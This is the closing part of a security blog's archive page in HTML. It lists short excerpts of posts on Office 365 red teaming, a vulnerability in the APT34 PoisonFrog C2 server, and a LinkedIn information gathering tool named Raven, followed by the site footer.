    <p class="archive__item-excerpt" itemprop="description">During our red team operations, we frequently come in contact with organisations using Office 365. The present tooling targeted at this environment is somewh...</p>
  </article>
</div>

        
          



<div class="grid__item">
  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
    
    <h2 class="archive__item-title" itemprop="headline">
      
        <a href="/security/apt34/malware/poisonfrog/vulnerability/2019/05/31/apt-34-poisonfrog-vulnerability.html" rel="permalink">A journey on APT34 PoisonFrog C2 Server
</a>
      
    </h2>
    
    <p class="archive__item-excerpt" itemprop="description">In the recent years APTs have been the center of infosec. Mainly because of the public coverage by the media, glorifying by security companies and many more ...</p>
  </article>
</div>

        
          



<div class="grid__item">
  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
    
    <h2 class="archive__item-title" itemprop="headline">
      
        <a href="/2018/09/24/raven-linkedin-information-gathering.html" rel="permalink">Raven - Linkedin Information Gathering Tool
</a>
      
    </h2>
    
    <p class="archive__item-excerpt" itemprop="description">Introduction
Last summer I wrote a simple tool named Raven, which would extract public information from Google and Linkedin and build e-mail list that could ...</p>
  </article>
</div>

        
      </div>
    </div>
  
  
</div>

    </div>

    

    <div id="footer" class="page__footer">
      <footer>
        <!-- start custom footer snippets -->

<!-- end custom footer snippets -->
        <div class="page__footer-follow">
  <ul class="social-icons">
    

    

    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
  </ul>
</div>

<div class="page__footer-copyright">&copy; 2020 0x09AL Security blog. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>

      </footer>
    </div>

    
  <script src="/assets/js/main.min.js"></script>
  <script src="https://kit.fontawesome.com/4eee35f757.js"></script>










  </body>
</html>
